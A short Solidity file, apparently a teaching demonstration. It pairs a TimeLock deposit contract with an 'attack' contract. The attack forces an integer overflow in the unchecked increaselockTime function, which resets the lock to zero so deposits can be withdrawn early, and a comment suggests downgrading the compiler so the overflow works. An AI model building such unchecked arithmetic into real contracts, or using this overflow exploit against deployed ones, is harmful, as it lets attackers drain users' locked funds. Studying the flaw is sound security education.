// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;  //change the version  to ^0.7.6
//pragma solidity ^0.7.6;


contract TimeLock{
    mapping(address => uint256) public balance;
    mapping(address => uint256)public userTimeLock;


    function deposit()external  payable {
        require(msg.value >0,"less than 0");
        balance[msg.sender] += msg.value;
        userTimeLock[msg.sender]= block.timestamp + 1 weeks;
    }

    function increaselockTime(uint256 _newIncreaseTimeLock)public{
        userTimeLock[msg.sender] += _newIncreaseTimeLock;
    }

    function withdraw()public {
        require(balance[msg.sender]>0,"less than 0");
        require(userTimeLock[msg.sender]<block.timestamp,"not yet matured");
        uint256 amount = balance[msg.sender];
        balance[msg.sender] =0;
        (bool sent,)= msg.sender.call{value:amount}("");
        require(sent,"failed");
    }
}

contract attack{
    TimeLock public timelock;

    constructor(address _timelock){
        timelock = TimeLock(_timelock);
    }
    fallback() external payable { }

    function attackIt()public payable {
        timelock.deposit{value:msg.value}();

        timelock.increaselockTime(type(uint256).max +1 - timelock.userTimeLock(address(this)));
        timelock.withdraw();
    }
}